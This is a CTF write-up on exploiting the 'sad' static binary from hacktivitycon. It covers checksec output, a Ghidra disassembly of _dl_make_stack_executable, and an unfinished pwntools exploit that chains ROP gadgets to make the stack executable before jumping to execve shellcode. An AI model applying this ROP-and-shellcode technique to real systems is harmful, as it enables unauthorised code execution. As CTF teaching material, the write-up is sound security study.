# The Tale of the Really SAD binary

Static and Dynamic was an interesting challenge for me. I was able to figure
this out; however, I had to try two different methods in order to successfully
get it. The method of using syscalls already has a writeup for it. You can
[click here](https://ctftime.org/task/12566) to view them. Rather I will show
you how I tried to solve this challenge and how I was *almost* successful.

The first thing that I did was run `checksec` on it.  
```bash  
$ checksec sad  
[*] '/home/wittsend2/Documents/hacktivitycon-ctf/pwn/sad/sad'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

The weird part to me was that there was a canary. So I tried testing it out by
running it.

```bash  
wittsend2@ubuntu:[~/Documents/hacktivitycon-ctf/pwn/sad]  
$ python -c "print('A'*264)"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
wittsend2@ubuntu:[~/Documents/hacktivitycon-ctf/pwn/sad]  
$ ./sad  
This is a really big binary. Hope you have everything you need ;)  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Segmentation fault (core dumped)  
wittsend2@ubuntu:[~/Documents/hacktivitycon-ctf/pwn/sad]  
$  
```  
Hmmm, doesn't actually seems like there was a canary; thus, I will ignore that
it was enabled. I also figured out that it took 256 bytes to start to overflow
the buffer; thus, I will use that when crafting my exploit.

Lets see if we can reverse this binary and find something interesting. When
looking through the binary in Ghidra, I found this function called:
`_dl_make_stack_executable`, and my brain thought it hit jackpot.

Let's break down this file and see what we need to do.

```C  
ulong _dl_make_stack_executable(ulong *param_1)

{  
 int iVar1;  
 undefined4 extraout_var;  
 long in_FS_OFFSET;  
  
 iVar1 = mprotect((void *)(-_dl_pagesize &
*param_1),_dl_pagesize,__stack_prot);  
 if (iVar1 == 0) {  
   *param_1 = 0;  
   _dl_stack_flags = _dl_stack_flags | 1;  
   return CONCAT44(extraout_var,iVar1);  
 }  
 return (ulong)*(uint *)(in_FS_OFFSET + -0x40);  
}  
```  
```assembly  
                            **************************************************************  
                            *                          FUNCTION                          *  
                            **************************************************************  
                            undefined _dl_make_stack_executable()  
            undefined         AL:1           <RETURN>  
                            _dl_make_stack_executable                       XREF[4]:     Entry Point(*),   
                                                                                         _dl_map_object_from_fd.constprop  
                                                                                         004a69b0(*), 004af138(*)    
       0046c120 f3 0f 1e fa     ENDBR64  
       0046c124 48 8b 35        MOV        RSI,qword ptr [_dl_pagesize]                     = 0000000000001000h  
                ed 2f 04 00  
       0046c12b 8b 15 bf        MOV        EDX,dword ptr [__stack_prot]                     = 01000000h  
                1d 04 00  
       0046c131 53              PUSH       RBX  
       0046c132 48 89 fb        MOV        RBX,RDI  
       0046c135 48 89 f7        MOV        RDI,RSI  
       0046c138 48 f7 df        NEG        RDI  
       0046c13b 48 23 3b        AND        RDI,qword ptr [RBX]  
       0046c13e e8 2d 3b        CALL       mprotect                                         int mprotect(void * __addr, size  
                fd ff  
       0046c143 85 c0           TEST       EAX,EAX  
       0046c145 75 19           JNZ        LAB_0046c160  
       0046c147 48 c7 03        MOV        qword ptr [RBX],0x0  
                00 00 00 00  
       0046c14e 5b              POP        RBX  
       0046c14f 83 0d b2        OR         dword ptr [_dl_stack_flags],0x1                  = 00000007h  
                2f 04 00 01  
       0046c156 c3              RET  
       0046c157 66              ??         66h    f  
       0046c158 0f              ??         0Fh  
       0046c159 1f              ??         1Fh  
       0046c15a 84              ??         84h  
       0046c15b 00              ??         00h  
       0046c15c 00              ??         00h  
       0046c15d 00              ??         00h  
       0046c15e 00              ??         00h  
       0046c15f 00              ??         00h  
                            LAB_0046c160                                    XREF[1]:     0046c145(j)    
       0046c160 48 c7 c0        MOV        RAX,-0x40  
                c0 ff ff ff  
       0046c167 5b              POP        RBX  
       0046c168 64 8b 00        MOV        EAX,dword ptr FS:[RAX]  
       0046c16b c3              RET  
       0046c16c 0f              ??         0Fh  
       0046c16d 1f              ??         1Fh  
       0046c16e 40              ??         40h    @  
       0046c16f 00              ??         00h  
```

From what we are looking at, it seems that it is awrapper for `mprotect()`. It
takes `__stack_prot` as a parameter, which determines whether `NX` is enabled.
After doing some research, I realized that the value of `__stack_prot` needed
to be `7` so that it can be executable (this is done through a ROP chain).
Afterwards, we can jump to the stack with shellcode. Here is what I crafted
for the exploit so far. There is a slight issue with it, can you see it?:

```py  
from pwn import *

local = True

if local == True:  
   elf = ELF('./sad')  
   p = elf.process()  
else:  
   p = remote("jh2i.com", 50002)

shellcode =
b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  
log.info(len(shellcode))  
nops = b'\x90'*(264) #- len(shellcode))

with open("symbols.txt", "w") as f:  
   f.write(str(elf.symbols.keys()))

rbp = p64(0x402d00)  
pop_rsi_ret = p64(0x407aae) #pop rrsi; ret  
pop_rax_ret = p64(0x43f8d7) #pop eax; ret  
pop_rcx_ret = p64(0x4073e3) #pop rcx; ret  
pop_rsp_ret = p64(0x40299b) #pop rsp; ret  
pop_rdi_ret = p64(0x403434) #pop rdi ; ret  
#mov_rsi_ret = p64(0x46b8a5) #mov qword ptr [rsi] ; rax ; ret  
addr_exec_stack = p64(elf.symbols['_dl_make_stack_executable'])  
print("_dl_make_stack_executable function location: " + str(addr_exec_stack))  
addr_stack_prot = p64(elf.symbols['__stack_prot'])  
print("Stack prot variable: " + str(addr_stack_prot))  
libc_stack_end = p64(elf.symbols['__libc_stack_end'])  
print("Stack end: " + str(libc_stack_end))

payload = nops  
payload += pop_rsi_ret  
payload += addr_stack_prot  
payload += pop_rax_ret  
payload += p64(0x7)  
# payload += mov_rsi_ret

payload += pop_rdi_ret  
payload += libc_stack_end  
payload += addr_exec_stack  
# NEED JMP_RSP  
payload += shellcode

with open("payload.txt", "wb") as f:  
   f.write(payload)  
#leave_ret = p64(0x401e25)

# print(elf.symbols['puts'])  
# payload = shellcode + nops + leave_ret + addr

p.recvuntil("This is a really big binary. Hope you have everything you need
;)")  
p.sendline(payload)  
p.interactive()  
```

The issue is that we need an address to `jmp rsp`; however, when using
ROPgadget, I was unable to find it. This is the fianl piece to test further
whether stack. It is likely that **I might need to make adjustments after
finding jmp rsp**; however, I wanted to share the concept of this path to the
exploit with everyone. If you have any questions for me, please reach out to
me on [The Ragnar Security Twitter](https://twitter.com/ragnarsecurity).  

Original writeup (https://github.com/WittsEnd2/hacktivitycon-ctf-
writeups/tree/master/Static_And_Dynamic).